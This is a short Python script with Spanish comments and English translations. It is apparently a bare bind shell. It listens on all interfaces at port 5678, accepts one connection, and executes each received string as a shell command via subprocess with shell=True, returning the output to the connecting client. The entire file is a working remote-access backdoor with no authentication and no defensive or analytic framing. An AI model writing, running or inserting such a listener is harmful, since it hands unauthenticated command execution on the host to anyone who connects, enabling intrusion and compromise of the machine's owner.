#!/usr/bin/python
# -*- coding: utf-8 -*-
# Modules #

import socket
import sys
import time
import subprocess

# Creates a TCP/IP socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Binds the socket to the port

server_address = ('0.0.0.0', 5678)
sock.bind(server_address)

# Listens for incoming connections

sock.listen(1)
(sock, (host_c, puerto_c)) = sock.accept()
while True:
    cmd = sock.recv(100000)  # recibimos 100000 bytes de datos
    # (EN) Receives 100000 bytes of data

    output = subprocess.Popen(
        cmd,
        shell=True,
        bufsize=100000,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        close_fds=True,
        )

    # Inicia un nuevo proceso, recibido por recv y guardado en cmd
    # (EN) Starts a new process, received by recv and saved in cmd

    out = output.stdout.read()  # leemos la salida de dicho proceso
    # (EN) Reads the output of the process

    sock.send(out)  # enviamos la salida del proceso al cliente
    # (EN) Sends the process output to the client
